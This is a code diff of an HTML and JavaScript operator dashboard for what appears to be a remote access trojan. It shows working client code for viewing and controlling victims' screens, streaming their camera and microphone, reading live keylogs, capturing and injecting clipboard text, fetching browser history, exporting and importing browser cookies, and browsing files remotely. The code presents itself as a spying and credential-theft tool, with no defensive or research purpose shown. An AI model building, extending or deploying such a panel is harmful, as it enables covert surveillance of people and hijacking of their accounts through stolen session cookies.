+    <button class="nav-btn" data-p="hist"><span class="ico">&#x1F310;</span><span>History</span></button>
+    <button class="nav-btn" data-p="cookie"><span class="ico">&#x1F36A;</span><span>Cookies</span></button>
+    <button class="nav-btn" data-p="fm"><span class="ico">&#x1F4C1;</span><span>Files</span></button>
+  </div>
+  <div class="nav-grp">
+    <div class="nav-lbl">System</div>
+    <button class="nav-btn" data-p="si"><span class="ico">&#x1F4BB;</span><span>System Info</span></button>
+    <button class="nav-btn" data-p="proc"><span class="ico">&#x2699;</span><span>Processes</span></button>
+    <button class="nav-btn" data-p="ss"><span class="ico">&#x1F4F8;</span><span>Screenshot</span></button>
+    <button class="nav-btn" data-p="rec"><span class="ico">&#x23FA;</span><span>Recording</span></button>
+  </div>
+</nav>
 
-  <!-- SIDEBAR -->
-  <nav id="sidebar">
-    <div class="nav-section">
-      <div class="nav-label">Monitor</div>
-      <button class="nav-btn active" data-panel="screen-panel"><span class="icon">🖥</span><span>Screen</span></button>
-      <button class="nav-btn" data-panel="cam-panel"><span class="icon">📷</span><span>Camera</span></button>
-      <button class="nav-btn" data-panel="mic-panel"><span class="icon">🎙</span><span>Microphone</span></button>
-      <button class="nav-btn" data-panel="clip-panel"><span class="icon">📋</span><span>Clipboard</span></button>
-    </div>
-    <div class="nav-section">
-      <div class="nav-label">Data</div>
-      <button class="nav-btn" data-panel="kl-panel"><span class="icon">⌨</span><span>Keylogs</span></button>
-      <button class="nav-btn" data-panel="cookie-panel"><span class="icon">🍪</span><span>Cookies</span></button>
-      <button class="nav-btn" data-panel="fm-panel"><span class="icon">📁</span><span>Files</span></button>
-    </div>
-    <div class="nav-section">
-      <div class="nav-label">System</div>
-      <button class="nav-btn" data-panel="proc-panel"><span class="icon">⚙</span><span>Processes</span></button>
-      <button class="nav-btn" data-panel="rec-panel"><span class="icon">⏺</span><span>Recording</span></button>
-    </div>
-  </nav>
+<div id="main">
 
-  <!-- MAIN -->
-  <div id="main">
-
-    <!-- SCREEN -->
-    <div class="panel active" id="screen-panel">
-      <div id="screen-wrap">
-        <canvas id="screen-canvas"></canvas>
-        <div id="screen-overlay">
-          <button class="screen-btn" id="fs-btn">⛶ Fullscreen</button>
-        </div>
-      </div>
-      <div id="desktop-ctrl">
-        <span style="color:var(--muted);font-size:.75rem;align-self:center">Desktop:</span>
-        <button class="ctrl-btn" data-dcmd="new">+ New</button>
-        <button class="ctrl-btn" data-dcmd="left">← Left</button>
-        <button class="ctrl-btn" data-dcmd="right">Right →</button>
-        <button class="ctrl-btn" data-dcmd="close">✕ Close</button>
-      </div>
-      <div id="remote-kb">
-        <input id="kb-input" type="text" placeholder="Type here to send keys to the remote PC…">
-        <button id="kb-send">Send</button>
-      </div>
+  <!-- SCREEN -->
+  <div class="panel on" id="scr">
+    <div id="scr-wrap">
+      <canvas id="scr-canvas"></canvas>
+      <div id="scr-overlay"><button class="scr-btn" id="fs-btn">Fullscreen</button></div>
     </div>
-
-    <!-- CAMERA -->
-    <div class="panel" id="cam-panel">
-      <div class="panel-header">
-        <h2>Camera</h2>
-        <button class="toggle-btn" id="cam-toggle">▶ Start</button>
-      </div>
-      <div id="cam-wrap"><img id="cam-img" src="" alt="Camera off"></div>
+    <div id="desk-ctrl">
+      <span style="color:var(--text3);font-size:.72rem;align-self:center">Desktop:</span>
+      <button class="dc-btn" data-dc="new">+ New</button>
+      <button class="dc-btn" data-dc="left">&larr; Left</button>
+      <button class="dc-btn" data-dc="right">Right &rarr;</button>
+      <button class="dc-btn" data-dc="close">&times; Close</button>
     </div>
-
-    <!-- MICROPHONE -->
-    <div class="panel" id="mic-panel">
-      <div class="panel-header"><h2>Microphone</h2></div>
-      <div class="panel-body">
-        <div id="mic-vis">🎙</div>
-        <div id="mic-label">Microphone is off</div>
-        <button class="toggle-btn" id="mic-toggle">▶ Start</button>
-      </div>
+    <div id="kb-bar">
+      <input id="kb-in" type="text" placeholder="Type here to send keys to remote PC...">
+      <button id="kb-send">Send</button>
     </div>
+  </div>
 
-    <!-- CLIPBOARD -->
-    <div class="panel" id="clip-panel">
-      <div class="panel-header"><h2>Clipboard</h2><span class="ph-meta" id="clip-count">0 entries</span></div>
-      <div id="clip-list"></div>
+  <!-- CAMERA -->
+  <div class="panel" id="cam">
+    <div class="ph"><h2>Camera</h2><button class="tog" id="cam-tog">Start</button></div>
+    <div id="cam-wrap"><img id="cam-img" src="" alt="Camera off"></div>
+  </div>
+
+  <!-- MICROPHONE -->
+  <div class="panel" id="mic">
+    <div class="ph"><h2>Microphone</h2></div>
+    <div class="pbody">
+      <div id="mic-orb">&#x1F399;</div>
+      <div id="mic-lbl">Microphone is off</div>
+      <button class="tog" id="mic-tog">Start</button>
     </div>
+  </div>
 
-    <!-- KEYLOGS -->
-    <div class="panel" id="kl-panel">
-      <div class="panel-header"><h2>Keylogs</h2><span class="ph-meta" id="kl-count">0 keys</span></div>
-      <div id="kl-toolbar">
-        <button id="kl-clear" class="danger">🗑 Clear view</button>
-        <a id="kl-export-link" href="#" target="_blank">⬇ Export HTML Report</a>
-      </div>
-      <div id="kl-feed"></div>
+  <!-- CLIPBOARD -->
+  <div class="panel" id="clip">
+    <div class="ph"><h2>Clipboard</h2><span class="meta" id="clip-n">0 entries</span></div>
+    <div id="clip-inject">
+      <input id="clip-text" type="text" placeholder="Type text to inject into remote clipboard...">
+      <button id="clip-send">Inject</button>
     </div>
+    <div id="clip-feed"></div>
+  </div>
 
-    <!-- COOKIES -->
-    <div class="panel" id="cookie-panel">
-      <div class="panel-header"><h2>Cookies</h2></div>
-      <div class="panel-body">
-        <button class="big-btn" id="btn-export-cookies">
-          <span class="bicon">📤</span>
-          <div class="binfo"><strong>Export Cookies</strong><span>Pull all browser cookies from the agent</span></div>
-        </button>
-        <button class="big-btn" id="btn-import-cookies">
-          <span class="bicon">📥</span>
-          <div class="binfo"><strong>Import Cookies</strong><span>Push a previously exported cookie set</span></div>
-        </button>
-        <div id="cookie-status">Ready.</div>
-      </div>
+  <!-- KEYLOGS -->
+  <div class="panel" id="kl">
+    <div class="ph"><h2>Keylogs</h2><span class="meta" id="kl-n">0 keys</span></div>
+    <div id="kl-bar">
+      <button class="act-btn danger" id="kl-clear">Clear</button>
+      <a class="act-btn primary" id="kl-export" href="#" target="_blank">Export Report</a>
     </div>
+    <div id="kl-feed"></div>
+  </div>
 
-    <!-- FILES -->
-    <div class="panel" id="fm-panel">
-      <div class="panel-header"><h2>File Manager</h2>
-        <label id="fm-upload-btn" style="margin-left:auto;background:var(--accent);color:#fff;border-radius:7px;padding:6px 14px;font-size:.8rem;cursor:pointer;font-weight:600;">⬆ Upload</label>
-        <input id="fm-upload-input" type="file" style="display:none">
-      </div>
-      <div id="fm-path-bar">
-        <input id="fm-path" type="text" placeholder="Remote path…">
-        <button id="fm-go">Go</button>
-      </div>
-      <div id="fm-list"></div>
-      <div id="fm-editor">
-        <div id="fm-editor-path"></div>
-        <textarea id="fm-textarea"></textarea>
-        <div style="display:flex;gap:8px;justify-content:flex-end">
-          <button id="fm-download">⬇ Download</button>
-          <button id="fm-save">Save File</button>
-        </div>
-      </div>
+  <!-- BROWSER HISTORY -->
+  <div class="panel" id="hist">
+    <div class="ph">
+      <h2>Browser History</h2>
+      <span class="meta" id="hist-n">--</span>
+      <button class="act-btn primary" id="hist-fetch">Fetch History</button>
     </div>
+    <div id="hist-bar"><input id="hist-q" type="text" placeholder="Filter by URL or title..."></div>
+    <div id="hist-list"></div>
+  </div>
 
-    <!-- PROCESSES -->
-    <div class="panel" id="proc-panel">
-      <div class="panel-header"><h2>Processes</h2><span class="ph-meta" id="proc-count">—</span></div>
-      <div id="proc-toolbar">
-        <input id="proc-search" type="text" placeholder="Filter by name or PID…">
-        <button id="proc-refresh">↺ Refresh</button>
-      </div>
-      <div id="proc-list"></div>
+  <!-- COOKIES -->
+  <div class="panel" id="cookie">
+    <div class="ph"><h2>Cookies</h2></div>
+    <div class="pbody" style="gap:12px">
+      <button class="big-btn" id="btn-exp-ck">
+        <span class="bi">&#x1F4E4;</span>
+        <div><strong>Export Cookies</strong><div class="sub">Pull all browser cookies from the agent</div></div>
+      </button>
+      <button class="big-btn" id="btn-imp-ck">
+        <span class="bi">&#x1F4E5;</span>
+        <div><strong>Import Cookies</strong><div class="sub">Push a previously exported cookie set</div></div>
+      </button>
+      <div id="cookie-status">Ready.</div>
     </div>
+  </div>
 
-    <!-- RECORDING -->
-    <div class="panel" id="rec-panel">
-      <div class="panel-header"><h2>Screen Recording</h2></div>
-      <div class="panel-body">
-        <div id="rec-indicator">⏺</div>
-        <div id="rec-label">Not recording</div>
-        <button id="rec-btn">Start Recording</button>
+  <!-- FILES -->
+  <div class="panel" id="fm">
+    <div class="ph">
+      <h2>File Manager</h2>
+      <label class="act-btn primary" id="fm-ul-btn" style="margin-left:auto;cursor:pointer">Upload</label>
+      <input id="fm-ul-in" type="file" style="display:none">
+    </div>
+    <div id="fm-pathbar"><input id="fm-path" type="text" placeholder="Remote path..."><button id="fm-go">Go</button></div>
+    <div id="fm-list"></div>
+    <div id="fm-edit">
+      <div id="fm-editpath"></div>
+      <textarea id="fm-ta"></textarea>
+      <div style="display:flex;gap:8px;justify-content:flex-end">
+        <button class="act-btn" id="fm-dl">Download</button>
+        <button class="act-btn primary" id="fm-save">Save</button>
       </div>
     </div>
+  </div>
 
-  </div><!-- /main -->
+  <!-- SYSTEM INFO -->
+  <div class="panel" id="si">
+    <div class="ph">
+      <h2>System Info</h2>
+      <button class="act-btn primary" id="si-fetch">Refresh</button>
+    </div>
+    <div class="pbody">
+      <div class="si-grid" id="si-grid">
+        <div style="color:var(--text3);grid-column:1/-1;text-align:center;padding:40px 0">Click Refresh to load system info</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PROCESSES -->
+  <div class="panel" id="proc">
+    <div class="ph"><h2>Processes</h2><span class="meta" id="proc-n">--</span><button class="act-btn" id="proc-ref">Refresh</button></div>
+    <div id="proc-bar"><input id="proc-q" type="text" placeholder="Filter by name or PID..."></div>
+    <div id="proc-list"></div>
+  </div>
+
+  <!-- SCREENSHOT -->
+  <div class="panel" id="ss">
+    <div class="ph"><h2>Screenshot</h2><button class="act-btn primary" id="ss-take">Take Screenshot</button></div>
+    <div class="pbody">
+      <div id="ss-status">Click to capture a full-resolution screenshot (PNG)</div>
+      <img id="ss-preview" src="">
+    </div>
+  </div>
+
+  <!-- RECORDING -->
+  <div class="panel" id="rec">
+    <div class="ph"><h2>Screen Recording</h2></div>
+    <div class="pbody">
+      <div id="rec-orb">&#x23FA;</div>
+      <div id="rec-lbl">Not recording</div>
+      <button class="tog" id="rec-tog">Start Recording</button>
+    </div>
+  </div>
+
+</div><!-- /main -->
 </div><!-- /shell -->
 
-<div id="toast-wrap"></div>
+<div id="toasts"></div>
 
 <script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.5/dist/socket.io.min.js"></script>
 <script>
-/* ── Utilities ──────────────────────────────────────────── */
-function toast(msg, type) {
-  const el = document.createElement("div");
-  el.className = "toast" + (type ? " " + type : "");
-  el.textContent = msg;
-  document.getElementById("toast-wrap").prepend(el);
-  setTimeout(() => el.remove(), 4000);
-}
-function fmtBytes(b) {
-  if (b < 1024) return b + " B";
-  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
-  return (b/1048576).toFixed(1) + " MB";
-}
-function esc(s) {
-  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
-}
+/* ── Utils ───────────────────────────────────────────────── */
+const $=s=>document.getElementById(s);const $$=s=>document.querySelectorAll(s);
+function toast(m,t){const e=document.createElement("div");e.className="toast"+(t?" "+t:"");e.textContent=m;$("toasts").prepend(e);setTimeout(()=>e.remove(),4000)}
+function fmtB(b){if(b<1024)return b+" B";if(b<1048576)return(b/1024).toFixed(1)+" KB";if(b<1073741824)return(b/1048576).toFixed(1)+" MB";return(b/1073741824).toFixed(1)+" GB"}
+function esc(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
+function fmtDate(ts){if(!ts)return"--";try{const d=new Date(ts*1000);return d.toLocaleDateString()+" "+d.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})}catch{return"--"}}
 
-/* ── Navigation ─────────────────────────────────────────── */
-document.querySelectorAll(".nav-btn").forEach(btn => {
-  btn.addEventListener("click", () => {
-    document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
-    document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));
-    btn.classList.add("active");
-    document.getElementById(btn.dataset.panel).classList.add("active");
-    if (btn.dataset.panel === "proc-panel" && currentAgent) reqProcesses();
+/* ── Navigation ──────────────────────────────────────────── */
+$$(".nav-btn").forEach(b=>{
+  b.addEventListener("click",()=>{
+    $$(".nav-btn").forEach(x=>x.classList.remove("active"));
+    $$(".panel").forEach(p=>p.classList.remove("on"));
+    b.classList.add("active");
+    $(b.dataset.p).classList.add("on");
+    if(b.dataset.p==="proc"&&agent)reqProcs();
   });
 });
 
-/* ── Socket.IO ──────────────────────────────────────────── */
-const socket = io({ transports: ["websocket", "polling"] });
-let currentAgent = "";
-let _exportedCookies = null;
+/* ── Socket ──────────────────────────────────────────────── */
+const socket=io({transports:["websocket","polling"]});
+let agent="",_expCk=null;
 
-const statusDot  = document.getElementById("status-dot");
-const statusText = document.getElementById("status-text");
-const agentSel   = document.getElementById("agent-select");
-const fpsBadge   = document.getElementById("fps-badge");
+socket.on("connect",()=>{$("conn-dot").classList.add("live");$("conn-txt").textContent="Connected";socket.emit("hub_join")});
+socket.on("disconnect",()=>{$("conn-dot").classList.remove("live");$("conn-txt").textContent="Disconnected"});
 
-socket.on("connect", () => {
-  statusDot.classList.add("live");
-  statusText.textContent = "Connected";
-  socket.emit("hub_join");
+socket.on("agent_list",list=>{
+  const sel=$("agent-sel"),prev=sel.value;
+  sel.innerHTML='<option value="">Select agent</option>';
+  list.forEach(a=>{const o=document.createElement("option");o.value=o.textContent=a.name;sel.appendChild(o)});
+  if(prev&&list.find(a=>a.name===prev))sel.value=prev;
+  else if(list.length===1){sel.value=list[0].name;agent=list[0].name;updExport()}
 });
-socket.on("disconnect", () => {
-  statusDot.classList.remove("live");
-  statusText.textContent = "Disconnected";
-});
-
-socket.on("agent_list", agents => {
-  const prev = agentSel.value;
-  agentSel.innerHTML = '<option value="">— select agent —</option>';
-  agents.forEach(a => {
-    const opt = document.createElement("option");
-    opt.value = opt.textContent = a.name;
-    agentSel.appendChild(opt);
-  });
-  if (prev && agents.find(a => a.name === prev)) {
-    agentSel.value = prev;
-  } else if (agents.length === 1) {
-    agentSel.value = agents[0].name;
-    currentAgent = agents[0].name;
-    updateExportLink();
-  }
-});
-
-agentSel.addEventListener("change", () => {
-  currentAgent = agentSel.value;
-  updateExportLink();
-});
+$("agent-sel").addEventListener("change",()=>{agent=$("agent-sel").value;updExport()});
 
 /* ── FPS ─────────────────────────────────────────────────── */
-let _fpsN = 0, _fpsSec = Date.now();
-function tickFps() {
-  _fpsN++;
-  const now = Date.now();
-  if (now - _fpsSec >= 1000) {
-    fpsBadge.textContent = _fpsN + " fps";
-    _fpsN = 0; _fpsSec = now;
-  }
-}
+let _fn=0,_ft=Date.now();
+function tickFps(){_fn++;const n=Date.now();if(n-_ft>=1000){$("fps-pill").textContent=_fn+" fps";_fn=0;_ft=n}}
 
-/* ── Screen (canvas for flicker-free rendering) ──────────── */
-const screenCanvas = document.getElementById("screen-canvas");
-const screenCtx    = screenCanvas.getContext("2d");
-let _pendingFrame  = null;
-let _rafPending    = false;
-
-function _drawPending() {
-  _rafPending = false;
-  if (!_pendingFrame) return;
-  const img = _pendingFrame; _pendingFrame = null;
-  if (screenCanvas.width !== img.naturalWidth)  screenCanvas.width  = img.naturalWidth;
-  if (screenCanvas.height !== img.naturalHeight) screenCanvas.height = img.naturalHeight;
-  screenCtx.drawImage(img, 0, 0);
-}
-
-socket.on("frame", d => {
-  if (d._agent !== currentAgent) return;
-  tickFps();
-  const img = new Image();
-  img.onload = () => {
-    _pendingFrame = img;
-    if (!_rafPending) { _rafPending = true; requestAnimationFrame(_drawPending); }
-  };
-  img.src = "data:image/jpeg;base64," + d.data;
+/* ── Screen ──────────────────────────────────────────────── */
+const cvs=$("scr-canvas"),ctx=cvs.getContext("2d");
+let _pf=null,_raf=false;
+function _draw(){_raf=false;if(!_pf)return;const img=_pf;_pf=null;if(cvs.width!==img.naturalWidth)cvs.width=img.naturalWidth;if(cvs.height!==img.naturalHeight)cvs.height=img.naturalHeight;ctx.drawImage(img,0,0)}
+socket.on("frame",d=>{
+  if(d._agent!==agent)return;tickFps();
+  const img=new Image();img.onload=()=>{_pf=img;if(!_raf){_raf=true;requestAnimationFrame(_draw)}};
+  img.src="data:image/jpeg;base64,"+d.data;
 });
 
-function _screenPos(e) {
-  const r = screenCanvas.getBoundingClientRect();
-  return { x:(e.clientX-r.left)/r.width, y:(e.clientY-r.top)/r.height };
-}
-screenCanvas.addEventListener("click", e => {
-  if (!currentAgent) return;
-  const {x,y} = _screenPos(e);
-  socket.emit("command", { action:"mouse_click", x, y, _target:currentAgent });
-});
-screenCanvas.addEventListener("contextmenu", e => {
-  e.preventDefault();
-  if (!currentAgent) return;
-  const {x,y} = _screenPos(e);
-  socket.emit("command", { action:"mouse_right", x, y, _target:currentAgent });
-});
-screenCanvas.addEventListener("wheel", e => {
-  e.preventDefault();
-  if (!currentAgent) return;
-  socket.emit("command", { action:"scroll", dy:e.deltaY>0?3:-3, _target:currentAgent });
-}, { passive:false });
-
-document.getElementById("fs-btn").addEventListener("click", () => {
-  const w = document.getElementById("screen-wrap");
-  document.fullscreenElement ? document.exitFullscreen() : w.requestFullscreen?.();
-});
-
-document.querySelectorAll("[data-dcmd]").forEach(btn => {
-  btn.addEventListener("click", () => {
-    if (!currentAgent) return;
-    socket.emit("desktop_cmd", { cmd:btn.dataset.dcmd, _target:currentAgent });
-  });
-});
-
-const kbInput = document.getElementById("kb-input");
-document.getElementById("kb-send").addEventListener("click", () => {
-  const text = kbInput.value;
-  if (!text || !currentAgent) return;
-  socket.emit("command", { action:"type", text, _target:currentAgent });
-  kbInput.value = "";
-});
-kbInput.addEventListener("keydown", e => { if (e.key === "Enter") document.getElementById("kb-send").click(); });
+function _spos(e){const r=cvs.getBoundingClientRect();return{x:(e.clientX-r.left)/r.width,y:(e.clientY-r.top)/r.height}}
+cvs.addEventListener("click",e=>{if(!agent)return;const{x,y}=_spos(e);socket.emit("command",{action:"mouse_click",x,y,_target:agent})});
+cvs.addEventListener("contextmenu",e=>{e.preventDefault();if(!agent)return;const{x,y}=_spos(e);socket.emit("command",{action:"mouse_right",x,y,_target:agent})});
+cvs.addEventListener("wheel",e=>{e.preventDefault();if(!agent)return;socket.emit("command",{action:"scroll",dy:e.deltaY>0?3:-3,_target:agent})},{passive:false});
+$("fs-btn").addEventListener("click",()=>{const w=$("scr-wrap");document.fullscreenElement?document.exitFullscreen():w.requestFullscreen?.()});
+$$("[data-dc]").forEach(b=>b.addEventListener("click",()=>{if(agent)socket.emit("desktop_cmd",{cmd:b.dataset.dc,_target:agent})}));
+$("kb-send").addEventListener("click",()=>{const t=$("kb-in").value;if(!t||!agent)return;socket.emit("command",{action:"type",text:t,_target:agent});$("kb-in").value=""});
+$("kb-in").addEventListener("keydown",e=>{if(e.key==="Enter")$("kb-send").click()});
 
 /* ── Keylogs ─────────────────────────────────────────────── */
-let klKeyCount = 0, klCurrentApp = "", klCurrentLine = null, klCurrentBlock = null;
-const klFeed = document.getElementById("kl-feed");
-const klCount = document.getElementById("kl-count");
-
-socket.on("key", d => {
-  if (d._agent && d._agent !== currentAgent) return;
-  klKeyCount++;
-  klCount.textContent = klKeyCount + " keys";
-  const app = d.app || "Unknown";
-  const ch  = d.char || "";
-  const ts  = d.time || "";
-
-  if (app !== klCurrentApp) {
-    klCurrentApp = app;
-    klCurrentLine = null;
-    const parts = app.split(" — ");
-    const block = document.createElement("div");
-    block.className = "kl-app-block";
-    block.innerHTML = `<div class="kl-app-hdr"><span>${esc(parts[0])}</span>${parts[1]?`<span style="color:var(--muted);font-weight:400"> — ${esc(parts[1])}</span>`:""}<span class="app-time">${esc(ts)}</span></div>`;
-    klCurrentBlock = block;
-    klFeed.appendChild(block);
+let _klN=0,_klApp="",_klLn=null,_klBlk=null;
+socket.on("key",d=>{
+  if(d._agent&&d._agent!==agent)return;
+  _klN++;$("kl-n").textContent=_klN+" keys";
+  const app=d.app||"Unknown",ch=d.char||"",ts=d.time||"";
+  if(app!==_klApp){
+    _klApp=app;_klLn=null;
+    const p=app.split(" — "),blk=document.createElement("div");blk.className="kl-block";
+    blk.innerHTML=`<div class="kl-hdr"><span>${esc(p[0])}</span>${p[1]?`<span style="color:var(--text3);font-weight:400"> — ${esc(p[1])}</span>`:""}<span class="t">${esc(ts)}</span></div>`;
+    _klBlk=blk;$("kl-feed").appendChild(blk);
   }
-
-  if (!klCurrentLine) {
-    klCurrentLine = document.createElement("div");
-    klCurrentLine.className = "kl-line";
-    klCurrentLine.innerHTML = `<span class="kl-ts">${esc(ts)}</span>`;
-    klCurrentBlock.appendChild(klCurrentLine);
-  }
-
-  let span;
-  if (ch === "⌫") span = `<span class="kl-bs">⌫</span>`;
-  else if (ch === "↵") { klCurrentLine = null; return; }
-  else if (["⇥","⎋","⌦","⇞","⇟","↑","↓","←","→"].includes(ch)) span = `<span class="kl-sp">${esc(ch)}</span>`;
-  else span = esc(ch);
-
-  klCurrentLine.innerHTML += span;
-  if (klFeed.scrollTop + klFeed.clientHeight > klFeed.scrollHeight - 80)
-    klFeed.scrollTop = klFeed.scrollHeight;
+  if(!_klLn){_klLn=document.createElement("div");_klLn.className="kl-ln";_klLn.innerHTML=`<span class="kl-ts">${esc(ts)}</span>`;_klBlk.appendChild(_klLn)}
+  let s;
+  if(ch==="⌫")s=`<span class="kl-bs">⌫</span>`;
+  else if(ch==="↵"){_klLn=null;return}
+  else if(["⇥","⎋","⌦","⇞","⇟","↑","↓","←","→"].includes(ch))s=`<span class="kl-sp">${esc(ch)}</span>`;
+  else s=esc(ch);
+  _klLn.innerHTML+=s;
+  const f=$("kl-feed");if(f.scrollTop+f.clientHeight>f.scrollHeight-80)f.scrollTop=f.scrollHeight;
 });
-
-document.getElementById("kl-clear").addEventListener("click", () => {
-  klFeed.innerHTML = "";
-  klKeyCount = 0; klCurrentApp = ""; klCurrentLine = null; klCurrentBlock = null;
-  klCount.textContent = "0 keys";
-});
-
-function updateExportLink() {
-  const link = document.getElementById("kl-export-link");
-  if (currentAgent) {
-    link.href = "/keylogs/" + encodeURIComponent(currentAgent);
-    link.style.opacity = "1"; link.style.pointerEvents = "";
-  } else {
-    link.href = "#"; link.style.opacity = ".4"; link.style.pointerEvents = "none";
-  }
-}
-updateExportLink();
+$("kl-clear").addEventListener("click",()=>{$("kl-feed").innerHTML="";_klN=0;_klApp="";_klLn=null;_klBlk=null;$("kl-n").textContent="0 keys"});
+function updExport(){const l=$("kl-export");if(agent){l.href="/keylogs/"+encodeURIComponent(agent);l.style.opacity="1";l.style.pointerEvents=""}else{l.href="#";l.style.opacity=".4";l.style.pointerEvents="none"}}
+updExport();
 
 /* ── Camera ──────────────────────────────────────────────── */
-const camImg = document.getElementById("cam-img");
-let camOn = false;
-socket.on("camera_frame", d => {
-  if (d._agent !== currentAgent) return;
-  camImg.src = "data:image/jpeg;base64," + d.data;
+let camOn=false;
+socket.on("camera_frame",d=>{if(d._agent!==agent)return;$("cam-img").src="data:image/jpeg;base64,"+d.data});
+$("cam-tog").addEventListener("click",function(){if(!agent)return;camOn=!camOn;socket.emit(camOn?"camera_on":"camera_off",{_target:agent});this.textContent=camOn?"Stop":"Start";this.classList.toggle("on",camOn)});
+
+/* ── Microphone ──────────────────────────────────────────── */
+let micOn=false,_actx=null,_npt=0;const SR=16000;
+function _getCtx(){if(!_actx||_actx.state==="closed"){_actx=new(window.AudioContext||window.webkitAudioContext)({sampleRate:SR});_npt=0}if(_actx.state==="suspended")_actx.resume();return _actx}
+socket.on("audio",d=>{
+  if(!micOn)return;if(agent&&d._agent&&d._agent!==agent)return;
+  try{
+    const c=_getCtx(),raw=atob(d.data),i16=new Int16Array(raw.length/2);
+    for(let i=0;i<i16.length;i++)i16[i]=(raw.charCodeAt(i*2))|(raw.charCodeAt(i*2+1)<<8);
+    const f32=new Float32Array(i16.length);for(let i=0;i<i16.length;i++)f32[i]=i16[i]/32768;
+    const buf=c.createBuffer(1,f32.length,SR);buf.copyToChannel(f32,0);
+    const src=c.createBufferSource();src.buffer=buf;src.connect(c.destination);
+    const now=c.currentTime;if(_npt<now+.01)_npt=now+.08;src.start(_npt);_npt+=buf.duration;
+  }catch(e){console.warn("audio:",e)}
 });
-document.getElementById("cam-toggle").addEventListener("click", function() {
-  if (!currentAgent) return;
-  camOn = !camOn;
-  socket.emit(camOn ? "camera_on" : "camera_off", { _target:currentAgent });
-  this.textContent = camOn ? "⏹ Stop" : "▶ Start";
-  this.classList.toggle("on", camOn);
-});
-
-/* ── Microphone + Audio playback ─────────────────────────── */
-let micOn = false;
-let _audioCtx = null;
-let _nextPlayAt = 0;
-const SAMPLE_RATE = 16000;
-
-function _getAudioCtx() {
-  if (!_audioCtx || _audioCtx.state === "closed") {
-    _audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: SAMPLE_RATE });
-    _nextPlayAt = 0;
-  }
-  if (_audioCtx.state === "suspended") _audioCtx.resume();
-  return _audioCtx;
-}
-
-socket.on("audio", d => {
-  if (!micOn) return;
-  // Only filter by agent if both sides are known; never drop when uncertain
-  if (currentAgent && d._agent && d._agent !== currentAgent) return;
-  try {
-    const ctx = _getAudioCtx();
-    // Decode base64 → Int16 PCM → Float32
-    const raw = atob(d.data);
-    const int16 = new Int16Array(raw.length / 2);
-    for (let i = 0; i < int16.length; i++)
-      int16[i] = (raw.charCodeAt(i*2)) | (raw.charCodeAt(i*2+1) << 8);
-    const float32 = new Float32Array(int16.length);
-    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768;
-
-    const buf = ctx.createBuffer(1, float32.length, SAMPLE_RATE);
-    buf.copyToChannel(float32, 0);
-
-    const src = ctx.createBufferSource();
-    src.buffer = buf;
-    src.connect(ctx.destination);
-
-    // Schedule back-to-back; 80ms jitter buffer on first chunk
-    const now = ctx.currentTime;
-    if (_nextPlayAt < now + 0.01) _nextPlayAt = now + 0.08;
-    src.start(_nextPlayAt);
-    _nextPlayAt += buf.duration;
-  } catch(e) { console.warn("audio playback:", e); }
-});
-
-document.getElementById("mic-toggle").addEventListener("click", function() {
-  if (!currentAgent) return;
-  micOn = !micOn;
-  socket.emit(micOn ? "mic_on" : "mic_off", { _target:currentAgent });
-  this.textContent = micOn ? "⏹ Stop" : "▶ Start";
-  this.classList.toggle("on", micOn);
-  document.getElementById("mic-vis").classList.toggle("active", micOn);
-  document.getElementById("mic-label").textContent = micOn ? "Microphone is live…" : "Microphone is off";
-  if (micOn) _getAudioCtx(); // unlock audio context on user gesture
-  else if (_audioCtx) { _audioCtx.close(); _audioCtx = null; }
+$("mic-tog").addEventListener("click",function(){
+  if(!agent)return;micOn=!micOn;socket.emit(micOn?"mic_on":"mic_off",{_target:agent});
+  this.textContent=micOn?"Stop":"Start";this.classList.toggle("on",micOn);
+  $("mic-orb").classList.toggle("on",micOn);$("mic-lbl").textContent=micOn?"Microphone is live...":"Microphone is off";
+  if(micOn)_getCtx();else if(_actx){_actx.close();_actx=null}
 });
 
 /* ── Clipboard ───────────────────────────────────────────── */
-let clipCount = 0;
-socket.on("clipboard", d => {
-  if (d._agent !== currentAgent) return;
-  clipCount++;
-  document.getElementById("clip-count").textContent = clipCount + " entries";
-  const el = document.createElement("div");
-  el.className = "clip-item";
-  el.innerHTML = `<div>${esc(d.text)}</div><div class="clip-ts">${new Date().toLocaleTimeString()}</div>`;
-  document.getElementById("clip-list").prepend(el);
+let clipN=0;
+socket.on("clipboard",d=>{
+  if(d._agent!==agent)return;clipN++;$("clip-n").textContent=clipN+" entries";
+  const el=document.createElement("div");el.className="clip-card";
+  el.innerHTML=`<div>${esc(d.text)}</div><div class="ts">${new Date().toLocaleTimeString()}</div>`;
+  $("clip-feed").prepend(el);
 });
+$("clip-send").addEventListener("click",()=>{
+  if(!agent)return;const t=$("clip-text").value;if(!t)return;
+  socket.emit("clipboard_set",{text:t,_target:agent});$("clip-text").value="";
+  toast("Clipboard text sent");
+});
+socket.on("clipboard_set_result",d=>{if(d.ok)toast("Clipboard set on remote PC","ok");else toast("Failed: "+(d.error||"?"),"err")});
 
 /* ── Processes ───────────────────────────────────────────── */
-let _allProcs = [];
-const procSearch = document.getElementById("proc-search");
-const procList   = document.getElementById("proc-list");
-
-function reqProcesses() {
-  if (!currentAgent) return;
-  socket.emit("get_processes", { _target:currentAgent });
-}
-document.getElementById("proc-refresh").addEventListener("click", reqProcesses);
-procSearch.addEventListener("input", renderProcs);
-
-socket.on("processes_result", d => {
-  _allProcs = d.processes || [];
-  document.getElementById("proc-count").textContent = _allProcs.length + " processes";
-  renderProcs();
-});
-
-function renderProcs() {
-  const q = procSearch.value.toLowerCase();
-  const list = q ? _allProcs.filter(p => (p.name||"").toLowerCase().includes(q)||String(p.pid).includes(q)) : _allProcs;
-  procList.innerHTML = "";
-  list.forEach(p => {
-    const row = document.createElement("div");
-    row.className = "proc-row";
